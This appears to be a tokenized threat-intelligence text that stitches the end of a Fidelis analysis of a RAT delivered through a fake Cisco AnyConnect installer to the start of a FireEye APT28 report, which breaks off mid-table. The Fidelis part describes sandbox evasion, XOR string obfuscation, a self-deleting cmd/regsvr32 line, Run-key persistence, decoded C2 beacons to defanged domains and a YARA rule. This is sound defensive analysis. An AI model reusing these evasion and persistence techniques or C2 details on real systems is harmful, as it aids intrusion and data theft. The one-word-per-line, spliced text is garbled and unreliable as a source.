a
slightly
more
sophisticated
ploy
to
the
average
user
or
to
a
less
experienced
systems
administrator
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Figure
6
-
Signature
Verified
by
VirusTotal

The
Cisco
AnyConnect
,
'
vpnui.exe
'
,
appears
to
be
a
legitimate
application
signed
by
Cisco
with
the
following
digital
signature
details
:

Name
of
signer
:

Signing
time
:

Certificate
serial
#
:
63
6c
75
43
dd
bd
f9
69
f4
73
16
0f
4b
09
9b
9e

Cisco
Systems
,
Inc
.

Friday
,
July
24
,
2015

By
choosing
common
VPN
software
there
is
a
high
chance
that
the
chosen
vendor's
software
may
be
in
use
within
the
intended
victim's
corporate
environment
.

Some
investigation
by
the
victim
into
the
legitimacy
of
the
software
title
,
like
in
Figure
6
,
is
intended
to
give
a
sense
that
it
was
the
right
thing
in
installing
this
security
software
.

Also
,
users
are
bombarded
by
various
software
applications
to
apply
security
patches
or
by
IT
departments
to
install
new
software
for
upgrades
and
increased
security
.

Most
security
software
runs
in
the
background
so
it
may
be
that
users
have
become
more
willing
to
run
security
software
because
they
know
they
need
it
despite
that
they
don't
know
what
it
actually
does
or
how
it
is
supposed
to
work
,
just
that
it
is
supposed
to
protect
them
.

The
use
of
this
Cisco
application
could
also
reveal
that
the
intended
targets
of
this
attack
may
be
a
system
administrator
holding
higher-level
privileged
access
credentials
to
multiple
areas
of
the
network
enterprise
and
infrastructure
.

If
this
malware
were
to
be
copied
amongst
other
copies
of
an
administrator's
software
library
,
the
system
administrator
may
later
confuse
this
malware
for
other
legitimate
Cisco
software
,
thus
infecting
him
and/or
another
user
to
whom
the
software
was
forwarded
.

Please
note
that
this
is
not
a
vulnerability
or
exploit
within
the
Cisco
product
,
but
a
decision
by
the
attacker
to
use
a
Cisco
application
as
a
decoy
.

Other
attacks
have
been
reported
to
use
similar
security
software
lures
,
such
as
Juniper
Networks
and
Microsoft
Exchange
.

RAT B_malware.backdoor
Installer
(
MD5
:
4F4BF27B738FF8F2A89D1BC487B054A8  B_hash
)

During
reverse
engineering
of
the
RAT B_malware.backdoor
Installer
we
observed
that
the
file
implemented
an
anti-behavioral
analysis
technique
.

This
technique
compared
the
mouse
/
cursor
pointer's
screen
position
coordinates
at
two
different
points
in
time
(
5000
milliseconds
)
.

The
author
is
using
routine
to
detect
whether
the
malware
has
been
executed
without
a
user
being
present
,
which
is
typically
done
during
sandbox
analysis
.

This
technique
will
defeat
less
sophisticated
sandboxes
that
do
not
implement
simulation
actions
,
such
as
mouse
movement
or
mouse
clicks
during
runtime
analysis
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Figure
7
-
Simple
Sandbox
Detection
Check
via
Mouse
Movement

The
RAT B_malware.backdoor
Installer
contains
an
obfuscated
malicious
DLL
payload
,
which
it
rebuilds
and
installs
.

The
embedded
file
(
MD5
:
75D3D1F23628122A64A2F1B7EF33F5CF
)
,
later
written
to
disk
as
adobe.dat
,
is
obfuscated
with
a
double
XOR
loop
with
keys
0x2C
and
0x7B
(
this
is
mathematically
equivalent
to
a
single
XOR
loop
with
the
byte
key
0x57
)
.

Once
this
DLL
is
de-obfuscated
,
we
observed
another
common
anti-behavioral
analysis
technique
used
to
try
and
extend
the
longevity
of
the
loaded
payload's
usage
.

The
malware
is
missing
an
appropriate
MZ
header
.

The
first
two
hexadecimal
bytes
of
the
payload
data
are
0x9B
0x8A
,
but
they
should
start
with
0x4D
0x5A
,
the
bytes
for
the
ASCII
characters
'
MZ
'
.

This
is
a
method
attackers
can
use
to
confuse
virus
detection
engines
looking
for
malicious
code
as
an
effort
to
detect
or
disinfect
the
data
in
memory
.

Virus
detection
engines
generally
hook
API
calls
in
User
mode
or
Kernel
mode
that
are
used
for
file
input
/
output
,
such
as
the
WriteFile
API
call
.

If
an
intact
executable
is
found
within
the
memory
buffer
the
binary
is
sent
off
for
behavioral
analysis
by
the
detection
engine
.

In
order
to
prevent
detonation
on
hosts
other
than
that
of
the
intended
victim
,
the
malware
author
has
purposely
mangled
the
first
two
bytes
of
the
RAT B_malware.backdoor
Implant
.

After
writing
the
payload
implant
code
the
first
two
bytes
of
the
file
are
corrected
from
0x9B
0x8A
to
0x4D
0x5A
and
the
malware
is
entrenched
into
the
system
.

Figure
8
–
Two
WriteFile
API
calls
.
The
First
to
Write
the
Payload
File
and
Then
the
Second
to
Correct
the
First
to
Bytes
to
MZ
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Figure
9
-
Registry
Entrenchment
Entry

The
RAT B_malware.backdoor
Installer
also
sets
the
entrenchment
/
persistence
mechanism
for
the
payload
malware
.

While
this
is
a
trivial
persistence
method
,
the
malware
Payload
DLL
has
the
ability
to
reference
this
registry
key
during
the
un-install
routine
,
which
will
be
described
later
.

Finally
,
just
before
exit
the
RAT B_malware.backdoor
Installer
lauches
a
new
process
with
a
similar
argument
string
to
,
'
cmd
/c
ping
127.0.0.1&del
'
%TEMP%\
Center111940519.exe'&regsvr32
/s
'
%AppData%\adobe\adobe.dat
'
'
.

Within
this
command
several
things
are
happening
:

1
.
A
ping
to
local
host
acts
as
a
command
to
sleep
for
four
seconds

2
.
Delete
itself
,
the
RAT B_malware.backdoor
Installer
file
,
Center111940519.exe

3
.
Execute
the
Implant
DLL
Payload
file

RAT B_malware.backdoor
Implant
/
Payload
(
MD5
:
75D3D1F23628122A64A2F1B7EF33F5CF  B_hash
)

Figure
10
-
Unicode
String
Stacking
then
XOR
deobfuscation
of
the
User-Agent
String

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Analysis
of
the
malicious
payload
DLL
reveals
that
the
malware
was
using
a
string
stacking
technique
that
moves
four
bytes
of
a
Unicode
string
at
a
time
into
memory
.

This
technique
is
used
as
needed
throughout
the
binary
and
each
time
with
different
XOR
key
bytes
.

For
example
,
the
string
at
the
relative
virtual
address
(
RVA
)
0x10001630
is
loaded
and
then
XOR'd
with
key
0x0d
to
reveal
the
following
User-agent
string
in
Unicode
format
:

Mozilla/5.0
(
Windows
NT
6.3;
WOW64;
Trident/7.0;rv:11.0
)
like
Gecko

Similar
activity
also
occurs
at
RVA
0x10000179F
where
the
string
is
XOR'd
with
key
0x14
to
reveal
the
following
static
string
observed
in
the
beacon
to
the
C2
:

1a53b0cp32e46g0qio9

The
code
for
that
procedure
is
below
:

While
this
string
stacking
technique
is
very
common
within
shellcode
,
it
is
less
frequently
used
with
Unicode
strings
because
Unicode
strings
are
two
bytes
in
length
for
every
character
,
as
compared
to
one-byte
length
for
ASCII
characters
.

This
technique
doubles
the
amount
of
data
needed
for
the
string
.

Other
malware
families
such
as
Ixeshe
/
Etumbot B_malware.backdoor
,
which
are
known
to
be
used
by
Numbered
Panda
,
also
utilize
this
technique
.

The
string
stacking
technique
is
used
to
make
analysis
more
difficult
so
that
the
strings
cannot
be
easily
discovered
by
malware
analysis
tools
such
as
XORSearch
.

Again
,
the
less-interesting
Double
XOR
routine
appears
to
be
used
to
obfuscate
the
C2
domain
with
the
single-byte
keys
0x70
and
0x79
.

In
this
case
the
Double
XOR
with
0x70
and
0x79
is
mathematically
equivalent
to
a
Single
XOR
operation
using
0x09
.

While
the
Double
XOR
is
a
trivial
technique
,
it
is
the
sum
of
the
routines
and
keys
used
in
malware
that
can
end
up
leading
to
attribution
.

The
obfuscated
string
is
:

10006148
60
09
67
09
66
09
6A
09
67
09
68
09
7D
09
60
09
'
.g.f.j.g.h.}
.
'
.

10006158
66
09
67
09
27
09
6A
09
66
09
64
09
f.g.'.j.f.d.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Below
is
a
table
that
shows
the
mathematical
logic
in
how
the
above
is
decoded
into
the
actual
C2
domain
:

Obfuscated
String

1st
XOR
Key

Result

2nd
XOR
Key

C2
Hex

C2
ASCII

0x70
0x79

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

And
this
is
the
portion
of
the
code
responsible
for
this
process
:

Figure
11
-
Assembly
Code
Instructions
for
the
Double
XOR
Routine

Next
,
the
malware
implant
uses
more
than
one
layer
to
obfuscate
its
network
Command
and
Control
(
C2
)
communications
.

The
outer
layer
is
an
encrypted
HTTPS
via
an
SSL
/
TLS
connection
using
the
Windows
'
standard
SSL/TLS
libraries
.

A
SSL/TLS
connection
is
used
as
an
effort
to
prevent
others
in
the
open
Internet
from
seeing
the
contents
of
a
communication
.

Figure
12
-
Malware
Sets
the
Flag
WINHTTP_FLAG_SECURE
Requesting
An
SSL/TLS
Connection
Out

Commercial
enterprises
will
generally
purchase
SSL
Inspection
hardware
that
essentially
perform
a
Man-In-The-Middle
technique
on
all
SSL
/
TLS
traffic
that
passes
through
it
,
allowing
the
entity
to
have
visibility
and
inspection
of
network
traffic
that
would
otherwise
be
non-visible
.

During
analysis
we
noticed
that
within
the
decrypted
SSL
/
TLS
communication
the
commands
to
/
from
the
C2
are
encoded
with
a
single-byte
XOR
.

An
additional
layer
used
to
thwart
detection
and
analysis
efforts
.

For
targets
in
which
a
victim
is
seated
in
an
organization
that
has
an
SSL
Inspection
device
,
the
malware
takes
this
additional
step
to
further
hide
its
network
activity
.

The
malware
uses
the
single-byte
XOR
key
0x5C
to
send
the
victim's
data
back
to
the
C2
,
and
in
the
C2
response
back
to
the
malware
the
command
arguments
received
are
obfuscated
with
a
different
key
of
0x2E
.

Completely
decrypted
and
de-obfuscated
network
traffic
from
this
malware
will
look
like
the
following
(
replace
COMPUTER_NAME
with
actual
name
of
computer
,
host
header
remove
brackets
)
:

POST
/-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9
HTTP/1.1

User-Agent
:
Mozilla/5.0
(
Windows
NT
6.3;
WOW64;
Trident/7.0;
rv:11.0
)
like
Gecko

Host
:
inocnation[.]com  B_url.unknown

Content-Length
:
8

Connection
:
Keep-Alive

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

In
the
above
POST
request
,
the
string
'
1a53b0cp32e46g0qio9
'
is
staticly
embedded
within
the
binary
,
not
changing
between
C2
beacons
,
and
the
negative
value
'
-1289335108
'
refers
to
the
signed
integer
representation
of
the
Victim's
Volume
Serial
Number
without
the
dash
(
'
-
'
)
.

Figure
13
shows
this
representation
for
a
Victim
system
using
the
Volume
Serial
Number
:
'
B326-4EBC
'
.

Figure
13
-
Hexidecimal
to
Signed
Integer
Conversion

The
DLL
can
accept
the
following
list
of
commands
from
its
C2
:

Binary
Command

0x10

0x90

0x02

0x60

0xA0

0x04

0x70

0x80

Description

Process
Execution

Reverse
Shell

File
Activity
(
delete
file
,
directory
browsing
,
etc
.
)

Upload
File
to
Victim
System

Download
File
From
Victim
System

Get
System
Information

Uninstall
Malware

The
Uninstall
command
was
the
most
interesting
,
suggesting
that
the
actor
controlling
this
malware
would
like
to
keep
a
limited
number
of
victims
by
removing
this
tool
when
commanded
.

THE
FIDELIS
TAKE

The
techniques
documented
in
this
report
indicate
a
level
of
sophistication
that
make
reverse
engineering
more
difficult
and
to
obscure
the
intentions
of
the
actor
behind
this
malware
.

Using
Cisco
AnyConnect
software
as
a
lure
continues
a
pattern
of
using
typical
corporate
software
as
a
vehicle
to
infect
victim
machines
.

The
use
of
multiple
XOR
keys
and
string
stacking
show
the
actor
is
spending
great
effort
to
deceive
reverse
engineers
and
incident
responders
.

The
use
of
both
SSL
/
TLS
and
encoded
communications
show
the
knowledge
many
enterprises
perform
SSL
man-in-the-middle
decryption
of
traffic
and
this
provides
a
layer
to
hide
communications
from
incident
responders
.

This
paper
highlights
many
of
these
techniques
and
how
we
were
able
to
bypass
them
.

Fidelis
Cybersecurity's
products
detect
the
activity
documented
in
this
paper
and
additional
technical
indicators
are
published
in
the
appendices
of
this
paper
and
to
the
Fidelis
Cybersecurity
github
at
https://github.com/fideliscyber B_url.normal
.

We
want
to
thank
our
fellow
security
researchers
at
CrowdStrike
for
sharing
hashes
of
the
malware
samples
analyzed
in
this
report
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Appendix  B_hash
A I
:
Summary
of
Informal
Triage
Analysis
On
Discovered
Payload
Files

MD5
Hash

75D3D1F23628122A64A2F1B7EF33F5CF  B_hash

D9821468315CCD3B9EA03161566EF18E  B_hash

B9AF5F5FD434A65D7AA1B55F5441C90A  B_hash

Function

RAT B_malware.backdoor
Implant
/
Payload

RAT B_malware.backdoor
Implant
/
Payload

RAT B_malware.backdoor
Implant
/
Payload

Description

OLE
Control
Library
(
DLL
)

OLE
Control
Library
(
DLL
)

OLE
Control
Library
(
DLL
)

The
first
two
DLLs
beacon
to
inocnation[dot]com  B_url.unknown
.

The
malware
for
this
analysis
was
compiled
between
April
-
August
2015
and
the
DLLs
exhibited
a
very
low
detection
rate
on
VirusTotal
.

Analysis
of
the
file
with
MD5
Hash
:
75D3D1F23628122A64A2F1B7EF33F5CF  B_hash

In
our
lab
,
this
file
is
written
as
%APPDATA%\adobe\adobe.bat
.

It
is
an
OLE
Control
DLL
exporting
the
basic
functions
named
DllRegisterServer
and
DllUnregisterServer
.

This
file
is
dropped
by
the
executable
file
with
MD5
hash
:
4F4BF27B738FF8F2A89D1BC487B054A8  B_hash
.

File
Metadata

File
Name
:

adobe.dat

File
Size
:

22016
bytes

MD5
:

SHA1
:

PE
Time
:

PEID
Sig
:

Sections
(
4
)
:

Name

.text

.rdata

.data

.reloc

Entropy

6.46

4.62

s4.28

75d3d1f23628122a64a2f1b7ef33f5cf  B_hash

3d7b789e3a630c0bd9db0b3217f72348025b845c    B_hash

0x55372A7A
[Wed
Apr
22
04:58:34
2015
UTC]

Microsoft
Visual
C++
v6.0
DLL

5c3d9bac10a06111e2bb1356bce6140a  B_hash
69fc21366b719cab74f899fb18a8c26f  B_hash
bf619eac0cdf3f68d496ea9344137e8b  B_hash
4e2b7dd08fa32594616a1d463e9b0975  B_hash

Entrenchment
mechanism
for
persistence
into
the
system
:

Key
:

Value
name
:

AdobePlayer

Value
data
:

regsvr32
/s
'
C:\Documents
and
Settings\[USER_NAME]\Application
Data\adobe\adobe.dat
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Analysis
of
the
file
with
MD5
Hash
:
D9821468315CCD3B9EA03161566EF18E  B_hash

This
DLL
payload
is
the
same
malware
family
,
contains
the
same
inocnation[dot]com B_url.unknown
C2
configuration
as
the
one
dropped
by
the
file
with
the

MD5
Hash
:
4F4BF27B738FF8F2A89D1BC487B054A8  B_hash
,
but
looks
to
be
compiled
via
a
slightly
different
source
.

d9821468315ccd3b9ea03161566ef18e  B_hash

b9308a65383681b862e16e4c042dbf7a61cce716  B_hash

0x55ECEE49
[Mon
Sep
07
01:54:17
2015
UTC]

Microsoft
Visual
C++
v6.0
DLL

File
Metadata

File
Name
:

d9821468315ccd3b9ea03161566ef18e.dll

File
Size
:

28672
bytes

MD5
:

SHA1
:

PE
Time
:

PEID
Sig
:

Sections
(
5
)
:

Name

.text

.rdata

.data

.rsrc

.reloc

ee6cde0fdae9bfa6c18b3783a23d0952  B_hash

886f6f3780467a511ae909d20390df5b  B_hash

54d7948676ee96b2f9e0a141598b564d  B_hash

e5665b3b3ffbbfcd5f2cbf31677fcbf9  B_hash

c1cea8dced657cfc85b045a2421417f1  B_hash

Entropy

6.48

4.77

1.16

5.55

4.64

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

When
this
malicious
DLL
is
executed
by
calling
it
with
its
'
DllRegisterServer
'
function
,
the
Victim
system
establishes
a
secure
and
encrypted
connection
on
port
443
and
beacons
with
the
following
request
(
encryption
layer
removed
)
.

POST
/-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio7
HTTP/1.1

User-Agent
:
Mozilla/5.0
(
Windows
NT
6.3;
WOW64;
Trident/7.0;
rv:11.0
)
like
Gecko

Host
:
inocnation[dot]com  B_url.unknown

Content-Length
:
8

Connection
:
Keep-Alive

Analysis
of
the
file
with
MD5
Hash
:
B9AF5F5FD434A65D7AA1B55F5441C90A  B_hash

This
is
a
malicious
DLL
that
belongs
to
the
same
malware
family
as
the
one
dropped
by
'
4f4bf27b738ff8f2a89d1bc487b054a8
'
,
and
is
almost
byte-by-byte
exactly
similar
except
for
the
fact
that
it
beacons
to
a
different
C2
domain
mail.cbppnews[dot]com B_url.unknown
.

This
DLL
also
contains
the
basic
export
functions
of
DllRegisterServer
and
DllUnregisterServer
.

The
main
difference
with
the
other
malware
is
the
C2
server
.

File
Metadata

File
Name
:
b9af5f5fd434a65d7aa1b55f5441c90a.dll

File
Size
:
22016
bytes

MD5
:
b9af5f5fd434a65d7aa1b55f5441c90a  B_hash

SHA1
:
9b1e902103f7e23d915f4d01c84779e0bdca6995  B_hash

PE
Time
:
0x55372A7A
[Wed
Apr
22
04:58:34
2015
UTC]

PEID
Sig
:
Microsoft
Visual
C++
v6.0
DLL

Sections
(
4
)
:

Name

Entropy

MD5

.text

6.46

5c3d9bac10a06111e2bb1356bce6140a  B_hash

.rdata

4.64

76ae6bd3bce3f1fb9a86b9faac9b42be  B_hash

.data

0.0

bf619eac0cdf3f68d496ea9344137e8b  B_hash

.reloc

4.28

4e2b7dd08fa32594616a1d463e9b0975  B_hash

When
this
malicious
DLL
is
executed
the
Victim
system
establishes
a
secure
and
encrypted
connection
on
port
443
and
beacons
with
the
following
request
(
encryption
layer
removed
)
.

POST
/-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9
HTTP/1.1

User-Agent
:
Mozilla/5.0
(
Windows
NT
6.3;
WOW64;
Trident/7.0;
rv:11.0
)
like
Gecko

Host
:
mail.cbppnews[dot]com B_url.unknown

Content-Length
:
8

Connection
:
Keep-Alive

The
following
string
represents
the
obfuscated
format
of
the
Command
&
Control
(
C2
)
domain
:

00B9FD24

25
48
29
48
21
48
24
48
66
48
2B
48
2A
48
38
48

%H)H!H$HfH+H*H8H

00B9FD34

38
48
26
48
2D
48
3F
48
3B
48
66
48
2B
48
27
48

8H&H-H?H;HfH+H'H

00B9FD44

25
48

The
C2
domain
is
de-obfuscated
using
the
same
code
observed
in
the
analysis
of
the
'
75D3D1F23628122A64A2F1B7EF33F5CF
'
(
malicious
DLL
payload
dropped
into
the
system
)
,
but
in
this
case
the
XOR
keys
used
are
different
from
the
sample
previously
analyzed
.

The
XOR
keys
used
are
0x39
and
0x71
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

Compile
Date

Thu
Aug
06
05:34:53
2015

Mon
Mar
01
10:28:24
2010

Thu
Aug
06
04:47:17
2015

Wed
Apr
22
04:58:34
2015

Mon
Sep
07
01:54:17
2015

Wed
Apr
22
04:58:34
2015

Appendix  B_hash
B I
:
File
Summary
and
Technical
Indicators

File
name

AV
Hits

Common
Risk
Name

Notes

Trojan.CryptRedol

None

Trojan.CryptRedol
.
Gen.3

Trojan
-
FH
-
DR!75D3D1F23628

Trojan.FHDR!tr

Trojan-FHDR
!
Backdoor.HIXOR.A

Trojan.A!tr

Launcher
/
Dropper

Legit
Cisco
AnyConnect
Mobility
Client
installer

Malware
installer

Malicious

Malicious

Malicious

a7bd555866ae1c161f78630a638850e7  B_hash

Win-Release-web-deploy
.

5cb6e6e0fbe87eba975b5ae0efaf2ca4  B_hash

Center14430654.dat
/
anyconnect
-
win-4.1.04011web-deploy-k9.exe

4f4bf27b738ff8f2a89d1bc487b054a8  B_hash

Center111940519.dat

75d3d1f23628122a64a2f1b7ef33f5cf  B_hash

adobe.dat

d9821468315ccd3b9ea03161566ef18e  B_hash

'
unknown
'

b9af5f5fd434a65d7aa1b55f5441c90a  B_hash

adobe.dat

Indicator
List
:

File
Entrenchment
Paths
:

%TEMP%\Center1[Decimal_Result_of_GetTickCount].dat

%TEMP%\Center[Decimal_Result_of_GetTickCount].dat

%AppData%\adobe\adobe.dat

Persistence
Location
:

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
AdobePlayer='regsvr32/s
%AppData%\malware\adobe\adobe.dat
'

Memory
Artifacts
:

inocnation[dot]com  B_url.unknown

mail.cbppnews[dot]com  B_url.unknown

1a53b0cp32e46g0qio9

Hashes
:

A7BD555866AE1C161F78630A638850E7  B_hash

4F4BF27B738FF8F2A89D1BC487B054A8  B_hash

75D3D1F23628122A64A2F1B7EF33F5CF  B_hash

D9821468315CCD3B9EA03161566EF18E  B_hash

B9AF5F5FD434A65D7AA1B55F5441C90A  B_hash

DNS
:
inocnation[dot]com  B_url.unknown

mail.cbppnews[dot]com  B_url.unknown

Resolved
IPs
:

211.104.106[.]41  B_ip.unknown
(
inocnation
from
August
to
October
,
2015
)

87.198.23[.]40  B_ip.unknown
(
inocnation
,
current
)

202.172.32[.]160  B_ip.unknown
(
cbppnews
,
current
)

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

hash1
=
'
75d3d1f23628122a64a2f1b7ef33f5cf  B_hash
'

hash2
=
'
d9821468315ccd3b9ea03161566ef18e  B_hash
'

hash3
=
'
b9af5f5fd434a65d7aa1b55f5441c90a  B_hash
'

meta
:

strings
:

//
Mozilla/5.0
(
Windows
NT
6.3;
WOW64;
Trident/7.0;rv:11.0
)
like
Gecko
$
=
{
c7
[2]
64
00
63
00
c7
[2]
69
00
62
00
c7
[2]
7a
00
7e
00
c7
[2]
2d
00
43
00
c7
[2]
59
00
2d
00
c7
[2]
3b
00
23
00
c7
[2]
3e
00
36
00
c7
[2]
2d
00
5a
00
c7
[2]
42
00
5a
00
c7
[2]
3b
00
39
00
c7
[2]
36
00
2d
00
c7
[2]
59
00
7f
00
c7
[2]
64
00
69
00
c7
[2]
68
00
63
00
c7
[2]
79
00
22
00
c7
[2]
3a
00
23
00
c7
[2]
3d
00
36
00
c7
[2]
2d
00
7f
00
c7
[2]
7b
00
37
00
c7
[2]
3c
00
3c
00
c7
[2]
23
00
3d
00
c7
[2]
24
00
2d
00
c7
[2]
61
00
64
00
c7
[2]
66
00
68
00
c7
[2]
2d
00
4a
00
c7
[2]
68
00
6e
00
c7
[2]
66
00
62
00
}
//
offset
10001566

//
Software\Microsoft\Windows\CurrentVersion\Run
$
=
{
c7
[2]
23
00
24
00
c7
[2]
24
00
33
00
c7
[2]
38
00
22
00
c7
[2]
00
00
33
00
c7
[2]
24
00
25
00
c7
[2]
3f
00
39
00
c7
[2]
38
00
0a
00
c7
[2]
04
00
23
00
c7
[2]
38
00
00
00
c7
[2]
43
00
66
00
c7
[2]
6d
00
60
00
c7
[2]
67
00
52
00
c7
[2]
6e
00
63
00
c7
[2]
7b
00
67
00
c7
[2]
70
00
00
00
c7
[2]
43
00
4d
00
c7
[2]
44
00
00
00
c7
[2]
0f
00
43
00
c7
[2]
00
00
50
00
c7
[2]
49
00
4e
00
c7
[2]
47
00
00
00
c7
[2]
11
00
12
00
c7
[2]
17
00
0e
00
c7
[2]
10
00
0e
00
c7
[2]
10
00
0e
00
c7
[2]
11
00
06
00
c7
[2]
44
00
45
00
c7
[2]
4c
00
00
00
}
//
10003D09

$
=
{
66
[4-7]
0d
40
83
f8
44
7c
?
?
}

//
xor

//
inc

//
cmp

eax
,
14h

//
Loop
to
decode
a
static
string
.
It
reveals
the
'
1a53b0cp32e46g0qio9
'
static
string
sent

YARA
:
rule
apt_win32_dll_rat_1a53b0cp32e46g0qio7
in
the
beacon
word
ptr
[ebp+eax*2+var_5C]
,
14h
$
=
{
66
[4-7]
14
40
83
f8
14
7c
?
?
}
//
100017F0
$
=
{
66
[4-7]
56
40
83
f8
2d
7c
?
?
}
//
10003621
$
=
{
66
[4-7]
20
40
83
f8
1a
7c
?
?
}
//
10003640
$
=
{
80
[2-7]
2e
40
3d
50
02
00
00
72
?
?
}
//
10003930
$
=
'
%08x%08x%08x%08x
'
wide
ascii
$
=
'
WinHttpGetIEProxyConfigForCurrentUser
'
wide
ascii
condition
:
(
uint16(0
)
==
0x5A4D
or
uint32(0
)
==
0x4464c457f
)
and
(
all
of
them
)

WWW.FIDELISSECURITY.COM B_url.normal

Fidelis
Cybersecurity

|
800.652.4020
|

info@fidelissecurity.comCONTACT

US
TODAY
TO
LEARN
MORE
ABOUT

FIDELIS©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512Users

are
granted
permission
to
copy
and/or
distribute
this
document
in
its
original
electronic
form
and
print
copies
for
personal
use
.

This
document
cannot
be
modified
or
converted
to
any
other
electronic
or
machine-readable
form
in
whole
or
in
part
without
prior
written
approval
of
Fidelis
Cybersecurity
,
Inc
.

While
we
have
done
our
best
to
ensure
that
the
material
found
in
this
document
is
accurate
,
Fidelis
Cybersecurity
,
Inc
.

makes
no
guarantee
that
the
information
contained
herein
is
error
free
.
FIREEYE
iSIGHT
INTELLIGENCE

APT28
:

AT
THE
CENTER

OF
THE
STORM

RUSSIA
STRATEGICALLY
EVOLVES

ITS
CYBER
OPERATIONS

/
JAN
UARY
2017

CONTENTS

Introduction

Overview

APT28 B_malware.infosteal
Targeting
And
Intrusion
Activity

Table
1
-
APT28 B_malware.infosteal
Targeting
of
Political
Entities
and
Intrusion
Activity

Table
2
-
APT28 B_malware.infosteal
Network
Activity
Has
Likely
Supported

Information
Operations

From
Olympic
Slight
to
Data
Leak
:

Investigating
APT28 B_malware.infosteal
at
the
World
Anti-Doping
Agency

Conclusion

Appendix

INTRODUCTION

The
Democratic
National
Committee's
(
DNC
)
June
2016
announcement
attributing
its
network
breach
to
the
Russian
Government
triggered
an
international
debate
over
Russia's
sponsorship
of
information
operations
against
the
U.S.

At
issue
is
the
question
of
proof
:
did
the
Russian
Government
direct
the
group
responsible
for
the
breaches
and
related
data
leaks
?
If
so
,
is
this
simply
a
matter
of
accepted
state
espionage
,
or
did
it
cross
a
line
?
Was
the
DNC
breach
part
of
a
concerted
effort
by
the
Russian
Government
to
interfere
with
the
U.S.
presidential
election
?

Unfortunately
,
we
have
failed
to
ask
the
most
consequential
question
:
how
will

Russia
continue
to
employ
a
variety
of
methods
,
including
hacks
and
leaks
,
to
undermine
the
institutions
,
policies
,
and
actors
that
the
Russian
Government
perceives
as
constricting
and
condemning
its
forceful
pursuit
of
its
state
aims
?

Our
visibility
into
the
operations
of
APT28 B_malware.infosteal
-
a
group
we
believe
the
Russian

Government
sponsors
-
has
given
us
insight
into
some
of
the
government's
targets
,
as
well
as
its
objectives
and
the
activities
designed
to
further
them
.

We
have
tracked
and
profiled
this
group
through
multiple
investigations
,
endpoint
and
network
detections
,
and
continuous
monitoring
.

Our
visibility
into
APT28's B_malware.infosteal
operations
,
which
date
to
at
least
2007
,
has
allowed
us
to
understand
the
group's
malware
,
operational
changes
,
and
motivations
.

This
intelligence
has
been
critical
to
protecting
and
informing
our
clients
,
exposing
this
threat
,
and
strengthening
our
confidence
in
attributing
APT28 B_malware.infosteal
to
the
Russian
Government
.

OVERVIEW

On
December
29
,
2016
,
the
Department
of
Homeland
Security
(
DHS
)
and
Federal
Bureau
of
Investigation
(
FBI
)
released
a
Joint
Analysis

Report
confirming
FireEye's
long
held
public
assessment
that
the
Russian

Government
sponsors
APT28 B_malware.infosteal
.

Since
at
least
2007
,
APT28 B_malware.infosteal
has
engaged
in
extensive
operations
in
support
of
Russian
strategic
interests
.

The
group
,
almost
certainly
compromised
of
a
sophisticated
and
prolific
set
of
developers
and
operators
,
has
historically
collected
intelligence
on
defense
and
geopolitical
issues
.

APT28 B_malware.infosteal
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former

Soviet
Union
,
including
governments
and
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian

Government
.

Over
the
past
two
years
,
Russia
appears
to
have
increasingly
leveraged

APT28 B_malware.infosteal
to
conduct
information
operations
commensurate
with
broader
strategic
military
doctrine
.

After
compromising
a
victim
organization
,

APT28 B_malware.infosteal
will
steal
internal
data
that
is
then
leaked
to
further
political
narratives
aligned
with
Russian
interests
.

To
date
these
have
included
the
conflict
in
Syria
,
NATO-Ukraine
relations
,
the
European
Union
refugee
and
migrant
crisis
,
the
2016
Olympics
and
Paralympics
Russian
athlete
doping
scandal
,
public
accusations
regarding
Russian
state-sponsored
hacking
,
and
the
2016
U.S.
presidential
election
.

This
report
details
our
observations
of
APT28's B_malware.infosteal
targeting
,
and
our
investigation
into
a
related
breach
.

We
also
provide
an
update
on
shifts
in
the
group's
tool
development
and
use
,
and
summarize
the
tactics
APT28 B_malware.infosteal
employs
to
compromise
its
victims
.

APT28 B_malware.infosteal
TARGETING
AND

INTRUSION
ACTIVITY

In
October
2014
,
FireEye
released
APT28 B_malware.infosteal
:
A
Window
into

Russia's
Cyber
Espionage
Operations
?
,
and
characterized

APT28's B_malware.infosteal
activity
as
aligning
with
the
Russian
Government's
strategic
intelligence
requirements
.

While
tracking
APT28 B_malware.infosteal
,
we
noted
the
group's
interest
in
foreign
governments
and
militaries
,
particularly
those
of
European
and
Eastern

European
nations
,
as
well
as
regional
security
organizations
,
such
as
the
North
Atlantic
Treaty
Organization
(
NATO
)
and
the
Organization
for
Security
and
Cooperation
in
Europe
(
OSCE
)
,
among
others
.
Table
1
highlights
some
recent
examples
of
this
activity
.

TABLE
1
:
APT28 B_malware.infosteal
TARG
E
